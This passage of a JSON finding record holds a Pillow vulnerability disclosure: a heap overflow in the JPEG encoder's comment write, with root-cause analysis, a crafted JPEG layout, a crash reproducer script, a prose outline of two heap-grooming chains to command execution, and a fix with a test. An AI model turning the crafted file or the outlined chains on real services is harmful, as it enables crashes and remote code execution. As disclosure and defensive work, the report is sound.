              "fullDescription": {
                "markdown": "```\n============================================================================\nHeap buffer overflow writing JPEG comment after ICC profile fills buffer\nLocation: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nA heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.\n\nThe bug is in `ImagingJpegEncode()` in `src/libImaging/JpegEncode.c`. State 4 (line 330) calls `jpeg_write_marker()` for the COM comment marker without checking that the output buffer has room. Meanwhile, `JpegImagePlugin._save()` sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's `emit_byte()` stores one byte past the end and then decrements `free_in_buffer` from 0. The `size_t` counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.\n\nTriggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through `Image.open()` and then `im.save(..., \"JPEG\", icc_profile=im.info.get(\"icc_profile\"))`. That is the documented way to preserve colour. The comment is forwarded from `im.info` automatically, and no non-default setting is involved.\n\nThe attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.\n\nThe unguarded call was introduced in e50ae85ea406 (\"Use jpeg_write_marker to write comment\", 2022-12-05) and first shipped in 9.4.0.\n\n## Details\n\n`ImagingJpegEncode()` (`src/libImaging/JpegEncode.c`) is a resumable state machine that fills a caller-supplied output buffer of `bytes` bytes and returns when it is full. State 4 writes the JPEG COM marker with `jpeg_write_marker()` without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the \"extra\" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, `jpeg_write_marker()` is entered with `free_in_buffer == 0`. libjpeg's `emit_byte()` stores the byte first and tests `--free_in_buffer == 0` afterwards, so the `size_t` counter wraps to 2^64-1 instead of triggering the \"buffer full\" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in `src/encode.c`.\n\nA JPEG laid out as\n\n```\nFFD8                                   SOI\nFFE2 \u003clen\u003e \"ICC_PROFILE\\0\" 01 01 \u003c65498 bytes\u003e     -\u003e im.info[\"icc_profile\"]\nFFFE \u003clen\u003e \u003ccomment, any length 1..65533\u003e           -\u003e im.info[\"comment\"]\n\u003cany baseline RGB JPEG body\u003e\n```\n\nopened with `Image.open()` and re-saved with the usual colour-profile-preserving call\n\n```python\nim.save(out, \"JPEG\", icc_profile=im.info.get(\"icc_profile\"))\n```\n\nkills the Python process on the stock build at this commit: glibc aborts with `realloc(): invalid next size` / `corrupted size vs. prev_size`, or the process takes SIGSEGV inside `jpeg_write_marker`/`jpeg_write_scanlines`. Stopping at `JpegEncode.c:330` in gdb shows `next_output_byte - buf == 65536`, `free_in_buffer == 0`, `comment_size == 65533` before the call, and `next_output_byte - buf == 131073`, `free_in_buffer == 18446744073709486079` after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting `Invalid write ... 0 bytes after a block of size 65,569` from `jpeg_write_marker` called at `JpegEncode.c:330` before aborting on the corrupted heap metadata.\n\n### Code path\n\nThe buffer. `JpegImagePlugin._save()` sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:\n\n```python\n# src/PIL/JpegImagePlugin.py:859-862\n    else:\n        # The EXIF info needs to be written as one block, + APP1, + one spare byte.\n        # Ensure that our buffer is big enough. Same with the icc_profile block.\n        bufsize = max(len(exif) + 5, len(extra) + 1)\n```\n\n`ImageFile._save()` then takes `max(MAXBLOCK, bufsize, width*4)` (`src/PIL/ImageFile.py:662`, `MAXBLOCK = 65536`), and `_encode()` allocates exactly that: `buf = PyBytes_FromStringAndSize(NULL, bufsize)` (`src/encode.c:134`; the real-file path `_encode_to_file()` does `malloc(bufsize)` at `src/encode.c:190`). For the input above `len(extra) == 65516`, so the buffer is 65536 bytes. The `optimize`/`progressive` branch just above (`JpegImagePlugin.py:846-858`) is not immune: its `bufsize` adds `w*h` (or `2*w*h`), but the image dimensions and the ICC length both come from the file, so an exact fit is still constructible there (e.g. with a 19×1 image).\n\nThe \"+1 spare byte\" does not account for what libjpeg itself has already put in the buffer: in state 1 `jpeg_start_compress(\u0026cinfo, TRUE)` (`JpegEncode.c:279`) emits SOI + JFIF APP0, 20 bytes for an RGB source. State 3 then copies the extra block, clamped to the space remaining:\n\n```c\n// src/libImaging/JpegEncode.c:302-337\n        case 3:\n            if (context-\u003eextra) {\n                unsigned int n = context-\u003eextra_size - context-\u003eextra_offset;\n                if (n \u003e context-\u003edestination.pub.free_in_buffer) {\n                    n = context-\u003edestination.pub.free_in_buffer;\n                }\n                memcpy(context-\u003edestination.pub.next_output_byte, context-\u003eextra + context-\u003eextra_offset, n);\n                context-\u003edestination.pub.next_output_byte += n;\n                context-\u003edestination.pub.free_in_buffer -= n;\n                context-\u003eextra_offset += n;\n                if (context-\u003eextra_offset \u003e= context-\u003eextra_size) {\n                    state-\u003estate++;                 // done -\u003e fall into case 4, even with free_in_buffer == 0\n                } else {\n                    break;\n                }\n            } …\n\n        case 4:\n            if (context-\u003ecomment) {\n                jpeg_write_marker(\u0026context-\u003ecinfo, JPEG_COM,\n                                  (unsigned char *)context-\u003ecomment, context-\u003ecomment_size);   // :330 — no space check\n            }\n            state-\u003estate++;\n\n        case 5:\n            if (1024 \u003e context-\u003edestination.pub.free_in_buffer) {   // passes: free_in_buffer is now ~2^64\n                break;\n            }\n            … jpeg_write_scanlines(…) …\n```\n\nEvery other emitting state is guarded — state 2 requires `rawExifLen + 5 \u003c= free_in_buffer` (`:287`), state 5 requires 1024 free bytes (`:340`), state 6 requires 100 (`:368`). State 4 has no guard at all. The unguarded `jpeg_write_marker()` call was introduced in `e50ae85ea406` (\"Use jpeg_write_marker to write comment\", 2022-12-05) and first shipped in 9.4.0; at 9.3.0 the same input re-saves correctly.\n\nWith 20 header bytes plus 65516 extra bytes the copy consumes the buffer to the byte (`free_in_buffer == 0`) and, because the extra block is complete, control falls straight into state 4. One re-wrapped ICC APP2 segment costs 18 bytes of overhead (`JpegImagePlugin.py:788-806`), hence the 65498-byte profile payload. Pillow's destination manager cannot suspend (`empty_output_buffer()` returns FALSE, `JpegEncode.c:45-48`), which is why a *nearly* full buffer is harmless: with 1..N free bytes the comment write decrements `free_in_buffer` to 0 part-way, libjpeg raises `JERR_CANT_SUSPEND`, and the save fails with `OSError: broken data stream`. Only the exact-fit case skips that check, because libjpeg-turbo's marker writer is\n\n```c\n/* jcmarker.c */\n  *(dest-\u003enext_output_byte)++ = (JOCTET)val;\n  if (--dest-\u003efree_in_buffer == 0) { if (!(*dest-\u003eempty_output_buffer)(cinfo)) ERREXIT(cinfo, JERR_CANT_SUSPEND); }\n```\n\ni.e. it writes `buf[65536]` first and then wraps the counter. From there nothing limits the stream: the comment (up to 65533 attacker-chosen bytes) is written verbatim, state 5's 1024-byte check passes against the wrapped counter, and `jpeg_write_scanlines()` appends the full compressed image (≈100 KB for a 256×256 noisy source; proportional to the picture for larger ones). If the process survives that, `ImagingJpegEncode()` returns `next_output_byte - buf` (≈167000) as the byte count and `_encode()` calls `_PyBytes_Resize(\u0026buf, 167199)` on the 65536-byte object, which is where glibc usually notices the smashed neighbouring chunk.\n\nAll three ingredients come from the file. `JpegImagePlugin` reassembles APP2 `ICC_PROFILE` chunks into `im.info[\"icc_profile\"]` (`:238-241`) and stores the COM payload in `im.info[\"comment\"]` (`:194`); `_save()` forwards the comment on its own — `comment = info.get(\"comment\", im.info.get(\"comment\"))` (`:808`) — so the application only has to pass the ICC profile through, which is the standard way to keep colours correct when re-encoding (`docs/handbook/image-file-formats.rst:608`). Unlike `exif` and `xmp`, there is no length check on the comment in `_save()`. A PNG source works the same way: its `iCCP` chunk becomes `im.info[\"icc_profile\"]` and a `tEXt` chunk keyed `comment` becomes `im.info[\"comment\"]` (and, being zlib-compressed, the file is only ~60 KB); that variant was also confirmed to crash. `thumbnail()` and `convert()` carry `im.info` along, so the usual `open → thumbnail → convert(\"RGB\") → save(\"JPEG\", icc_profile=…)` handler reaches the same state. `xmp=` and `extra=` feed the same `extra` block (33 bytes of overhead for the XMP APP1) and reach the same state. If the application also forwards EXIF, the exact-fit condition becomes `len(extra) + len(exif) + 4 == 65516`, both lengths again taken from the file. The comment length is irrelevant to triggering: a 17-byte `\"Created with GIMP\"` comment crashes the stock build just as reliably (SIGSEGV in `jpeg_write_scanlines`), it only changes how many of the out-of-bounds bytes are chosen verbatim by the attacker.\n\n### What lies behind the buffer\n\nThe buffer is `PyBytes_FromStringAndSize(NULL, 65536)` = `malloc(65569)`, a 0x10030-byte glibc chunk, so `buf[65536]` is the first byte of the next chunk's header. In the same `encode()` call, right after that allocation, `jpeg_start_compress()` `malloc`s libjpeg's PERMANENT pool (chunk 0xa40) and IMAGE pool (chunk 0x3f00); on a groomed or fresh heap these sit directly behind the buffer. The next thing `ImagingJpegEncode()` does after the COM write (`JpegEncode.c:352`; the state-5 room check passes because `free_in_buffer` has wrapped) is call `jpeg_write_scanlines()`, which dispatches through the method tables in that IMAGE pool before any allocator call touches the heap. In the SIGSEGV layout observed on the stock build the fault is at `jpeg_write_scanlines+133: call *0x8(%rax)` with `%rax` pointing just past the end of the buffer at memory now holding comment bytes — an indirect call through a function pointer (`cinfo-\u003emain-\u003eprocess_data`) read from bytes the file supplied.\n\n## Impact\n\nAny service that accepts JPEG uploads and re-encodes them as JPEG while preserving the embedded ICC profile (`icc_profile=im.info.get(\"icc_profile\")` — thumbnailers, CMS and e-commerce image pipelines, Django/Flask upload handlers) can be made to perform a linear heap overwrite starting immediately after a 65536-byte buffer: 4 marker bytes, then up to 65533 bytes taken verbatim from the file's COM segment, then tens to hundreds of kilobytes of compressed image data. No non-default Pillow setting is involved and the file is an otherwise valid 140–210 KB JPEG that decodes normally. The dependable outcome is termination of the worker process by SIGSEGV or a glibc heap-consistency abort (not a Python exception), i.e. denial of service of everything that process serves.\n\nIt does not stop at a crash. Both the length and the content of the first 64 KB written out of bounds are attacker-chosen, the victim buffer is an ordinary `malloc` chunk, and what `jpeg_start_compress()` allocates directly behind it — libjpeg's PERMANENT and IMAGE pools, including the method pointers `jpeg_write_scanlines()` calls through immediately afterwards — is predictable. Against a long-lived stdlib-`http.server` worker running exactly the handler above (stock `/src` build, CPython 3.12 / glibc 2.36 / libjpeg62-turbo 2.1.5, ASLR/PIE/NX on, default Pillow settings, worker as root, attacker as uid 65534 given only the service address), this overflow was driven to shell command execution by the worker in two independent ways once library base addresses were known: (a) a JPEG with ~2400 APPn spray segments (heap grooming), the 65498-byte ICC profile and a 3020-byte COM whose bytes re-image the two libjpeg pools so that the real `grayscale_convert()` copies a chosen 384-byte scanline over `_PyRuntime`, setting `allocators.obj_arena.free = system` with `ctx` = the command — the request returns 200, the worker keeps serving, and the next pymalloc arena release runs the command (14/14 and 15/15 runs on fresh workers); (b) a 28-byte COM that rewrites the `size`/`next` of a groomed free tcache chunk sitting right behind the buffer so that Pillow's own `malloc(comment_size)` in the next JPEG save (`src/encode.c:1250`) returns `_imaging.so`'s writable `.got.plt`, the comment replaces `free` with `system`, and the encoder's cleanup `free(context-\u003ecomment)` at `JpegEncode.c:376` runs the command (14/14, deterministic once groomed). The address knowledge came from separate memory-disclosure bugs in Pillow's TIFF paths that return library pointers in output pixels/tags; those are independent defects with their own fixes, but any such disclosure — present or future — is enough, and this overflow is the only memory *write* either chain needs. Fixing it reduces those leaks to disclosures rather than footholds.\n\n## Reproducing\n\n`repro` is a single Python script. It uses the Pillow already built in `/src` and needs no rebuild. Run it as `./repro`. The last line of output is `BUG` or `OK`.\n\nThe script builds a valid 256×256 baseline JPEG from deterministic noise, so the compressed image data comes to about 100 KB. Right after SOI it adds an APP2 `ICC_PROFILE` segment (sequence 1 of 1) with a payload of `65536 - 20 - 18 = 65498` bytes. When Pillow re-encodes the image, libjpeg first writes 20 bytes of SOI and JFIF APP0, and then Pillow copies the re-wrapped ICC segment: 18 bytes of header plus the payload. Together those fill the 65536-byte encoder buffer to the last byte. The constants at the top of the script spell out this arithmetic.\n\nEach file goes through the same application code in a child `python3 -X faulthandler` process:\n\n```python\nim = Image.open(BytesIO(data))\nim.save(BytesIO(), \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n```\n\n1. **Control.** The file has the ICC profile but no COM segment. The save returns normally with exit status 0, which shows that the exact-fit ICC profile alone is harmless.\n2. **PoC.** This is the same file plus a COM segment of 65533 `C` bytes. `JpegImagePlugin._save()` forwards `im.info[\"comment\"]` automatically. Case 4 of `ImagingJpegEncode()` writes the COM marker into the full buffer, the `free_in_buffer` counter wraps, and the comment and the entire compressed image are written past the end of the heap buffer.\n\nExpected output: the control prints `save returned normally` and `-\u003e exit status 0`. For the PoC, faulthandler prints `Fatal Python error: Segmentation fault` (sometimes a glibc message such as `realloc(): invalid next size` followed by `Aborted`). The Python stack ends in `ImageFile._encode_tile` called from `im.save`, then `-\u003e exit status -11` (or `-6`), and finally `BUG`. The verdict is `BUG` only if the PoC child was killed by a signal. A normal return or a Python exception such as `OSError` gives `OK`.\n\n## Suggested fix\n\nThe attached patch guards state 4 the way state 2 guards the EXIF marker: before calling `jpeg_write_marker()` it requires room for the 4-byte marker header plus the comment plus libjpeg's one-byte slack (`emit_byte` must never bring `free_in_buffer` to 0 with a non-suspending destination), and otherwise returns to the caller for a fresh buffer:\n\n```diff\n--- a/src/libImaging/JpegEncode.c\n+++ b/src/libImaging/JpegEncode.c\n@@ -327,6 +327,11 @@\n         case 4:\n \n             if (context-\u003ecomment) {\n+                // check for comment len + 'COM' header bytes\n+                if (context-\u003ecomment_size + 5 \u003e\n+                    context-\u003edestination.pub.free_in_buffer) {\n+                    break;\n+                }\n                 jpeg_write_marker(\n```\n\nThe encoder then returns with the buffer full, `_encode_tile()` calls it again with an empty buffer, and the comment is emitted there. The C hunk is not sufficient on its own: state 4, like state 2, relies on the Python side guaranteeing that an *empty* buffer is always large enough, and a 65533-byte comment needs 65538 bytes against a 65536-byte `MAXBLOCK` buffer — with only the C guard the encoder returns 0 bytes and no error forever and `_encode_tile()` spins. The patch therefore also changes `JpegImagePlugin._save()` to reserve `len(comment) + 5` in both sizing branches (added to `bufsize` in the `optimize`/`progressive` branch, and as a third term of the `max()` in the plain branch), and normalises the comment to `bytes` first (`str` is UTF-8-encoded, `None` becomes `b\"\"`) so the length is exact for non-ASCII `str` comments; `encode.c` already UTF-8-encodes `str` via `z#`, so the bytes written are unchanged. A side effect visible to users: comments of up to 65533 bytes now save successfully in cases that previously raised `OSError: broken data stream` because the default buffer was too small. The patch adds `test_icc_big_comment` to `Tests/test_file_jpeg.py`, which round-trips a 65533-byte comment with ICC profiles sized around the exact-fit boundary; it crashes (or raises `OSError`) on the unpatched tree and passes with the patch. With the patch applied to a clean tree and rebuilt, the reproducer no longer triggers, and `Tests/test_file_jpeg.py` and `Tests/test_file_mpo.py` pass.\n\nThe C guard still depends on the Python sizing to avoid a 0-byte/no-error busy loop, exactly as state 2 already does. A more defensive variant would fail with `IMAGING_CODEC_MEMORY` instead of `break` when the marker does not fit and nothing has been written to the current buffer yet (`next_output_byte == buf`), so that a sizing mistake in any caller can never turn into a busy loop. It would also be consistent with `exif`/`xmp` handling for `_save()` to reject comments longer than `MAX_BYTES_IN_MARKER` (65533) with `ValueError(\"Comment is too long\")` rather than leaving it to libjpeg's `JERR_BAD_LENGTH` → `OSError`.\n\nIndependently, the \"+ 1 spare byte\" / \"+ 5\" reasoning in `_save()` under-counts by the 18–20 bytes `jpeg_start_compress()` writes before the EXIF/extra blocks; that is what lets attacker-sized metadata land the buffer on an exact boundary in the first place. The attached patch does not change that accounting.\n\n## The patch\n\nCheck free output-buffer space before writing the JPEG COM marker in ImagingJpegEncode, and size the encoder buffer for the comment in JpegImagePlugin._save\n\nApplies to `src/libImaging/JpegEncode.c` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_jpeg.py b/Tests/test_file_jpeg.py\nindex b361aef2e..f884883c4 100644\n--- a/Tests/test_file_jpeg.py\n+++ b/Tests/test_file_jpeg.py\n@@ -227,6 +227,16 @@ class TestFileJpeg:\n         im1 = self.roundtrip(hopper(), icc_profile=icc_profile)\n         assert im1.info.get(\"icc_profile\") == (icc_profile or None)\n \n+    def test_icc_big_comment(self) -\u003e None:\n+        # The ICC profile may fill the encoder buffer exactly, in which case the\n+        # comment has to be written to the next buffer\n+        comment = b\"C\" * 65533\n+        for n in range(ImageFile.MAXBLOCK - 40, ImageFile.MAXBLOCK - 30):\n+            icc_profile = b\"I\" * n\n+            im = self.roundtrip(hopper(), icc_profile=icc_profile, comment=comment)\n+            assert im.info[\"icc_profile\"] == icc_profile\n+            assert im.info[\"comment\"] == comment\n+\n     def test_large_icc_meta(self, tmp_path: Path) -\u003e None:\n         # https://github.com/python-pillow/Pillow/issues/148\n         # Sometimes the meta data on the icc_profile block is bigger than\ndiff --git a/src/PIL/JpegImagePlugin.py b/src/PIL/JpegImagePlugin.py\nindex 4b8d34ca3..1d9f4c2fa 100644\n--- a/src/PIL/JpegImagePlugin.py\n+++ b/src/PIL/JpegImagePlugin.py\n@@ -805,7 +805,9 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n             )\n             i += 1\n \n-    comment = info.get(\"comment\", im.info.get(\"comment\"))\n+    comment = info.get(\"comment\", im.info.get(\"comment\")) or b\"\"\n+    if isinstance(comment, str):\n+        comment = comment.encode()\n \n     # \"progressive\" is the official name, but older documentation\n     # says \"progression\"\n@@ -856,10 +858,13 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n             bufsize += len(exif) + 5\n         if extra:\n             bufsize += len(extra) + 1\n+        if comment:\n+            bufsize += len(comment) + 5\n     else:\n         # The EXIF info needs to be written as one block, + APP1, + one spare byte.\n-        # Ensure that our buffer is big enough. Same with the icc_profile block.\n-        bufsize = max(len(exif) + 5, len(extra) + 1)\n+        # Ensure that our buffer is big enough. Same with the icc_profile block\n+        # and the comment (COM marker).\n+        bufsize = max(len(exif) + 5, len(extra) + 1, len(comment) + 5)\n \n     ImageFile._save(\n         im, fp, [ImageFile._Tile(\"jpeg\", (0, 0, *im.size), 0, rawmode)], bufsize\ndiff --git a/src/libImaging/JpegEncode.c b/src/libImaging/JpegEncode.c\nindex 098e431fc..b6771c6ec 100644\n--- a/src/libImaging/JpegEncode.c\n+++ b/src/libImaging/JpegEncode.c\n@@ -327,6 +327,11 @@ ImagingJpegEncode(Imaging im, ImagingCodecState state, UINT8 *buf, int bytes) {\n         case 4:\n \n             if (context-\u003ecomment) {\n+                // check for comment len + 'COM' header bytes\n+                if (context-\u003ecomment_size + 5 \u003e\n+                    context-\u003edestination.pub.free_in_buffer) {\n+                    break;\n+                }\n                 jpeg_write_marker(\n                     \u0026context-\u003ecinfo,\n                     JPEG_COM,\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 3,343 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# Pillow heap buffer overflow in ImagingJpegEncode() (src/libImaging/JpegEncode.c, case 4).\n#\n# Re-saving a JPEG with its own ICC profile, the usual \"keep the colours\" re-encode:\n#     im = Image.open(f); im.save(out, \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n# If the ICC segment fills the 65536-byte encoder buffer to the last byte, the COM\n# marker (forwarded from im.info[\"comment\"] automatically) is written with\n# free_in_buffer == 0. libjpeg stores the byte, then decrements the counter, which\n# wraps to ~2^64, and the comment plus the whole compressed image go past the end\n# of the heap buffer. The Python process dies with SIGSEGV or a glibc abort.\n#\n# Runs against the stock build in /src, no rebuild. Takes about 2 seconds.\nimport random\nimport struct\nimport subprocess\nimport sys\nfrom io import BytesIO\n\nfrom PIL import Image\n\n# Output-buffer layout at the moment the COM marker is written:\nENCODER_BUFFER = 65536  # ImageFile.MAXBLOCK; _save() never makes it bigger here\nJFIF_HEADER = 20  # SOI + JFIF APP0, written by jpeg_start_compress()\nICC_OVERHEAD = 18  # FFE2 \u003clen\u003e \"ICC_PROFILE\\0\" \u003cseq\u003e \u003ccount\u003e\nICC_PAYLOAD = ENCODER_BUFFER - JFIF_HEADER - ICC_OVERHEAD  # 65498: exact fit\nCOMMENT = b\"C\" * 65533  # largest legal COM; content and length chosen by the file\n\n# What the victim application does with an uploaded file, run in a child process\n# so that we can see it die.\nRESAVE = \"\"\"\nimport sys\nfrom io import BytesIO\nfrom PIL import Image\nim = Image.open(BytesIO(sys.stdin.buffer.read()))\nim.save(BytesIO(), \"JPEG\", icc_profile=im.info[\"icc_profile\"])\nprint(\"save returned normally\")\n\"\"\"\n\n\ndef segment(marker, payload):\n    return bytes([0xFF, marker]) + struct.pack(\"\u003eH\", len(payload) + 2) + payload\n\n\ndef make_jpeg(with_comment):\n    \"\"\"A valid 256x256 JPEG: an ICC profile of ICC_PAYLOAD bytes, optionally a COM.\"\"\"\n    noise = random.Random(1234).randbytes(256 * 256 * 3)  # ~100 KB of image data\n    out = BytesIO()\n    Image.frombytes(\"RGB\", (256, 256), noise).save(out, \"JPEG\", quality=95)\n    plain = out.getvalue()\n\n    icc = segment(0xE2, b\"ICC_PROFILE\\0\\x01\\x01\" + b\"I\" * ICC_PAYLOAD)\n    com = segment(0xFE, COMMENT) if with_comment else b\"\"\n    return plain[:2] + icc + com + plain[2:]  # splice in right after SOI\n\n\ndef resave(jpeg):\n    # -X faulthandler: on a fatal signal, print where in Python the child died\n    cmd = [sys.executable, \"-X\", \"faulthandler\", \"-c\", RESAVE]\n    r = subprocess.run(cmd, input=jpeg, capture_output=True)\n    print((r.stdout + r.stderr).decode(errors=\"replace\").strip())\n    print(f\"-\u003e exit status {r.returncode}\")\n    return r.returncode\n\n\n# Control: the same file without a COM segment re-saves fine, so the buffer\n# sizing and the ICC profile on their own are harmless.\nprint(\"Control: re-save the JPEG without a comment\")\nresave(make_jpeg(with_comment=False))\n\n# The bug: add a COM segment. The comment is now written into a buffer that has\n# no room left.\nprint(f\"\\nPoC: re-save the JPEG with a {len(COMMENT)}-byte comment\")\nrc = resave(make_jpeg(with_comment=True))\n\n# A negative return code means the child was killed by a signal (SIGSEGV or\n# SIGABRT from glibc's heap checks), not by a Python exception.\nif rc \u003c 0:\n    print(f\"\\nim.save() killed the process with signal {-rc}: out-of-bounds heap write\")\n    print(\"BUG\")\nelse:\n    print(\"OK\")\n```\n\u003c/details\u003e\n\n---",
                "text": "```\n============================================================================\nHeap buffer overflow writing JPEG comment after ICC profile fills buffer\nLocation: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nA heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.\n\nThe bug is in `ImagingJpegEncode()` in `src/libImaging/JpegEncode.c`. State 4 (line 330) calls `jpeg_write_marker()` for the COM comment marker without checking that the output buffer has room. Meanwhile, `JpegImagePlugin._save()` sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's `emit_byte()` stores one byte past the end and then decrements `free_in_buffer` from 0. The `size_t` counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.\n\nTriggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through `Image.open()` and then `im.save(..., \"JPEG\", icc_profile=im.info.get(\"icc_profile\"))`. That is the documented way to preserve colour. The comment is forwarded from `im.info` automatically, and no non-default setting is involved.\n\nThe attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.\n\nThe unguarded call was introduced in e50ae85ea406 (\"Use jpeg_write_marker to write comment\", 2022-12-05) and first shipped in 9.4.0.\n\n## Details\n\n`ImagingJpegEncode()` (`src/libImaging/JpegEncode.c`) is a resumable state machine that fills a caller-supplied output buffer of `bytes` bytes and returns when it is full. State 4 writes the JPEG COM marker with `jpeg_write_marker()` without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the \"extra\" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, `jpeg_write_marker()` is entered with `free_in_buffer == 0`. libjpeg's `emit_byte()` stores the byte first and tests `--free_in_buffer == 0` afterwards, so the `size_t` counter wraps to 2^64-1 instead of triggering the \"buffer full\" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in `src/encode.c`.\n\nA JPEG laid out as\n\n```\nFFD8                                   SOI\nFFE2 \u003clen\u003e \"ICC_PROFILE\\0\" 01 01 \u003c65498 bytes\u003e     -\u003e im.info[\"icc_profile\"]\nFFFE \u003clen\u003e \u003ccomment, any length 1..65533\u003e           -\u003e im.info[\"comment\"]\n\u003cany baseline RGB JPEG body\u003e\n```\n\nopened with `Image.open()` and re-saved with the usual colour-profile-preserving call\n\n```python\nim.save(out, \"JPEG\", icc_profile=im.info.get(\"icc_profile\"))\n```\n\nkills the Python process on the stock build at this commit: glibc aborts with `realloc(): invalid next size` / `corrupted size vs. prev_size`, or the process takes SIGSEGV inside `jpeg_write_marker`/`jpeg_write_scanlines`. Stopping at `JpegEncode.c:330` in gdb shows `next_output_byte - buf == 65536`, `free_in_buffer == 0`, `comment_size == 65533` before the call, and `next_output_byte - buf == 131073`, `free_in_buffer == 18446744073709486079` after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting `Invalid write ... 0 bytes after a block of size 65,569` from `jpeg_write_marker` called at `JpegEncode.c:330` before aborting on the corrupted heap metadata.\n\n### Code path\n\nThe buffer. `JpegImagePlugin._save()` sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:\n\n```python\n# src/PIL/JpegImagePlugin.py:859-862\n    else:\n        # The EXIF info needs to be written as one block, + APP1, + one spare byte.\n        # Ensure that our buffer is big enough. Same with the icc_profile block.\n        bufsize = max(len(exif) + 5, len(extra) + 1)\n```\n\n`ImageFile._save()` then takes `max(MAXBLOCK, bufsize, width*4)` (`src/PIL/ImageFile.py:662`, `MAXBLOCK = 65536`), and `_encode()` allocates exactly that: `buf = PyBytes_FromStringAndSize(NULL, bufsize)` (`src/encode.c:134`; the real-file path `_encode_to_file()` does `malloc(bufsize)` at `src/encode.c:190`). For the input above `len(extra) == 65516`, so the buffer is 65536 bytes. The `optimize`/`progressive` branch just above (`JpegImagePlugin.py:846-858`) is not immune: its `bufsize` adds `w*h` (or `2*w*h`), but the image dimensions and the ICC length both come from the file, so an exact fit is still constructible there (e.g. with a 19×1 image).\n\nThe \"+1 spare byte\" does not account for what libjpeg itself has already put in the buffer: in state 1 `jpeg_start_compress(\u0026cinfo, TRUE)` (`JpegEncode.c:279`) emits SOI + JFIF APP0, 20 bytes for an RGB source. State 3 then copies the extra block, clamped to the space remaining:\n\n```c\n// src/libImaging/JpegEncode.c:302-337\n        case 3:\n            if (context-\u003eextra) {\n                unsigned int n = context-\u003eextra_size - context-\u003eextra_offset;\n                if (n \u003e context-\u003edestination.pub.free_in_buffer) {\n                    n = context-\u003edestination.pub.free_in_buffer;\n                }\n                memcpy(context-\u003edestination.pub.next_output_byte, context-\u003eextra + context-\u003eextra_offset, n);\n                context-\u003edestination.pub.next_output_byte += n;\n                context-\u003edestination.pub.free_in_buffer -= n;\n                context-\u003eextra_offset += n;\n                if (context-\u003eextra_offset \u003e= context-\u003eextra_size) {\n                    state-\u003estate++;                 // done -\u003e fall into case 4, even with free_in_buffer == 0\n                } else {\n                    break;\n                }\n            } …\n\n        case 4:\n            if (context-\u003ecomment) {\n                jpeg_write_marker(\u0026context-\u003ecinfo, JPEG_COM,\n                                  (unsigned char *)context-\u003ecomment, context-\u003ecomment_size);   // :330 — no space check\n            }\n            state-\u003estate++;\n\n        case 5:\n            if (1024 \u003e context-\u003edestination.pub.free_in_buffer) {   // passes: free_in_buffer is now ~2^64\n                break;\n            }\n            … jpeg_write_scanlines(…) …\n```\n\nEvery other emitting state is guarded — state 2 requires `rawExifLen + 5 \u003c= free_in_buffer` (`:287`), state 5 requires 1024 free bytes (`:340`), state 6 requires 100 (`:368`). State 4 has no guard at all. The unguarded `jpeg_write_marker()` call was introduced in `e50ae85ea406` (\"Use jpeg_write_marker to write comment\", 2022-12-05) and first shipped in 9.4.0; at 9.3.0 the same input re-saves correctly.\n\nWith 20 header 